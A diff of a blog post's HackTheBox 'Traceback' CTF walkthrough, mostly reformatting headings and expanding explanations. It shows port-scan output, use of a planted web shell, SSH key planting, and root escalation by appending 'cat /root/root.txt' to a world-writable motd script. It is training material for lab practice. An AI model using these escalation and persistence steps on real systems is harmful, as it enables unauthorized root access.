@@ -7,7 +7,7 @@ tags = [
     "CTF",
     "Bug",
 ]
-date = "2020-08-15"
+date = "2020-07-14"
 categories = [
     "HackTheBox",
     "CTF",
@@ -22,29 +22,33 @@ series = ["HackTheBox"]
 
 Let’s have a look at a machine which just got retired, Traceback is my second active machine that i have solved. An interesting box which recalls everything that we have learnt so far.
 
-Initial foothold is kind of CTF whereas going further is realtime.
+Initial foothold is kind of CTF like .
 
-**Tools:**
+
+----------
+### Tools:
 
 
 - Port Scan - Masscan and Nmap
 - Privilege Escalation - [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
 
-**Initial Foothold:**
+
+----------
+### Initial Foothold:
 
 As initial recon always start with scanning all open ports,
 
 **Masscan:**
 
-```
+
     #masscan
     open tcp 80 10.10.10.181 1591767945
     open tcp 22 10.10.10.181 1591767967
     #end
-```
+
 **Nmap:**
 
-```
+
     PORT   STATE SERVICE VERSION
     22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
@@ -84,14 +88,14 @@ As initial recon always start with scanning all open ports,
     HOP RTT       ADDRESS
     1   517.49 ms 10.10.14.1
     2   517.03 ms 10.10.10.181
-```
-Nothing special, lets check whats there in port 80
 
-```
+Nothing special, lets check what there in port 80
+
+
     This site has been owned
     I have left a backdoor for all the net. FREE INTERNETZZZ
     - Xh4H - 
-```
+
 So we are looking for an backdoor, Nice!!
 
 While checking page source we got some other hint which would drive us
@@ -143,10 +147,10 @@ I just logged in with default credentials which was mentioned in the file and cr
     /bin/sh: 0: can't access tty; job control turned off
     $ whoami
     webadmin
-    
 
-**Privilege Escalation towards user.txt:**
 
+----------
+### Privilege Escalation towards user.txt:
 
 
     $ ls -la
@@ -208,7 +212,10 @@ All set let’s go for escalation
 BOOM!!
 
 
-**Privilege Escalation toward root.txt:**
+----------
+
+
+### Privilege Escalation toward root.txt:
 
 Working without proper shell is hard, so lets add our public key in .ssh folder of sysadmin and login with that,
 
@@ -272,6 +279,17 @@ While running linPeas.sh , found some interesting stuffs like
 Let’s move to the folder and check whats happening there
 
 
+    $ ls -la
+    total 32
+    drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
+    drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
+    -rwxrwxr-x  1 root sysadmin  981 Aug 19 03:29 00-header
+    -rwxrwxr-x  1 root sysadmin  982 Aug 19 03:29 10-help-text
+    -rwxrwxr-x  1 root sysadmin 4264 Aug 19 03:29 50-motd-news
+    -rwxrwxr-x  1 root sysadmin  604 Aug 19 03:29 80-esm
+    -rwxrwxr-x  1 root sysadmin  299 Aug 19 03:29 91-release-upgrade
+
+
     $ cat 00-header 
     #!/bin/sh
     #
@@ -299,12 +317,12 @@ Let’s move to the folder and check whats happening there
     
     echo "\nWelcome to Xh4H land \n"
 
-So this is the one which greeted us while ssh, since it is world writable let’s do some magic
+So this is the one which greeted us while doing ssh. Since these files are world writable and executed by root user, let’s make use of this weakness to get flag from root.txt
 
 
     $ echo 'cat /root/root.txt' >> 00-header
 
-BOOM!!
+So literally what above command does is , appends our query to 00-header file which is then executed as shown below
 
 
     root@kali:~# ssh sysadmin@10.10.10.181
@@ -315,12 +333,14 @@ BOOM!!
     
     Welcome to Xh4H land 
     
-    afxxxxxxxxxxxxxxxxxxxxxxxxx16
+    {afxxxxxxxxxxxxxxxxxxxxxxxxx16} --> root.txt content
     
     
     Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
     
     Last login: Wed Aug 19 01:27:40 2020 from 10.10.14.76
 
+As you can see that root.txt content is displayed while we try to ssh. Likewise you can create a interactive shell by appending desired commands.
+ 
 Thank you, Have a nice day!! 😄 
 
